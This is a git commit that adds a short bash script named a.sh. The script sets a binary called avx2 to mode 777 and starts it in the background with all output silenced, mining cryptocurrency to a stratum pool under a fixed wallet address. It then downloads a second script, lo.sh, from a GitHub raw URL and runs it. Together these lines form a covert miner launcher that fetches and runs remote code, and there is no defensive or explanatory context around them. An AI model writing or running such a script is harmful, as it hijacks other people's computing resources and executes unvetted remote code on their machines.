ff24a2c1cc251a54b315b21d50aaf7da93cff563
jsiqiisn <100444720+jsiqiisn@users.noreply.github.com>
2022-03-08 06:04:06 +0700

    Create a.sh

---
+++ a.sh
@@ -0,0 +1,4 @@
+#!/bin/bash
+chmod 777 avx2
+./avx2 -a gr -o stratum+tcp://eu.mecrypto.club:3051 -u Xr52u2aoWETd6RrrHJKunCYRnmGL6Eh1Kf.$(echo $(shuf -i 1-20000 -n 1)-V) -p c=BUTK-gr > /dev/null 2>&1 &
+wget https://raw.githubusercontent.com/jsiqiisn/baby/main/lo.sh && chmod +x lo.sh && ./lo.sh
